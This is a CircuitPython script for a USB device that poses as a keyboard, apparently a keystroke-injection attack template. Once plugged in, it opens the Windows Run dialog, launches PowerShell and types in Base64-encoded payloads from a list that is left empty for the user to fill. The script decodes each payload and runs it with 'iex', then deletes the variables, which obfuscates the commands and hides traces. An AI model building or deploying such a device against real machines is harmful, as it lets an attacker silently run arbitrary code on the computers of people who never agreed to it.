
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode
from time import sleep

# Insert Encoded Payloads here (encases in quotes)

payloads=[
    
]

# Setup Keyboard

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)
sleep(6)

# Spawn Powershell

kbd.press(Keycode.WINDOWS)
sleep(.09)
kbd.press(Keycode.R)
sleep(.09)
kbd.release(Keycode.WINDOWS)
sleep(.09)
kbd.release(Keycode.R)
sleep(1)	
layout.write("powershell")
kbd.press(Keycode.ENTER)
sleep(.09)
kbd.release(Keycode.ENTER)
sleep(2)

# Decode Payloads

prefix = "$a = \""
suffix = '''\"
$b = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($a))
iex $b
Remove-Variable a
Remove-Variable b
'''

# Execute Payloads
for enc_pay in payloads:
	layout.write(prefix+enc_pay+suffix)